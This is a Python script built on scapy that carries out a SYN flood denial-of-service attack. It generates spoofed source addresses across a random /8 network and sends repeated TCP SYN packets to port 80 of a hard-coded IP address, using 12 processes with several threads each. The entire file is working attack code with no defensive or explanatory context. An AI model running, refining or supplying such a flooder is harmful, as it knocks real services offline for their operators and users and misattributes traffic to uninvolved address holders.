import sys
import threading
from queue import Queue
from scapy.all import *
from queue import Queue
import multiprocessing
import os
import random
import ipaddress
import ipaddress
import random

no_of_process = 12
q = Queue()

def launch():
    block1 = random.randint(1, 125)
    block1 = str(block1)
    ip_network = block1 + ".0.0.0/8"
    net4 = ipaddress.ip_network(ip_network)
    for ip in net4:
        x = str(ip)
        p = (IP(src=x, dst="144.217.100.106") / TCP(dport=80,flags="S"))
        send(p, count=20)


NUMBER_OF_WORKERS = 5
NUMBER_OF_JOBS = 5
total_process = []


def create_thread():
    for i in range(NUMBER_OF_WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()


def create_jobs():
    for my_worker in range(NUMBER_OF_JOBS):
        q.put(my_worker)
    q.join()


def worker():
    for x in range(NUMBER_OF_JOBS):
        my_worker = q.get()  # get job and remove from que
        launch()
        q.task_done()  # when task is complete


def run():
    print(f"process id {os.getpid()}")
    create_thread()
    create_jobs()
    worker()


for i in range(0, no_of_process):
    process = multiprocessing.Process(target=run, )
    process.start()
    total_process.append(process)

for i in range (0,no_of_process):

    total_process[i].join()
